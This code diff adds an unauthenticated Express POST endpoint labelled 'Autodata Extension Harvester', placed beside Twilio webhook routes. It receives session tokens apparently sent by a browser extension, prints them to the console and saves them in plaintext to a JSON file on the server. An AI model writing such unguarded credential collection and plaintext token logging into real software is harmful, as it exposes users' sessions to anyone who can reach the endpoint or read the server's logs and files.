@@ -28,6 +28,21 @@ function setupApp(app: Express) {
     // GET endpoints for testing
     app.get("/api/webhooks/twilio", handleWebhookTest);
     app.get("/api/webhooks/twilio/status", handleWebhookTest);
+
+    // Autodata Extension Harvester endpoint
+    app.post("/api/webhooks/autodata", (req, res) => {
+      console.log("\n[AUTODATA HARVESTER] Received new session tokens:");
+      console.log(JSON.stringify(req.body, null, 2));
+
+      // Optional: Save to a file so server can read it
+      const fs = require('fs');
+      const path = require('path');
+      try {
+        fs.writeFileSync(path.join(process.cwd(), 'server', 'autodata_session.json'), JSON.stringify(req.body, null, 2));
+      } catch (e) { /* ignore */ }
+
+      res.json({ success: true, received: true });
+    });
   } catch (e) {
     console.warn("Failed to register Twilio webhooks", e);
   }
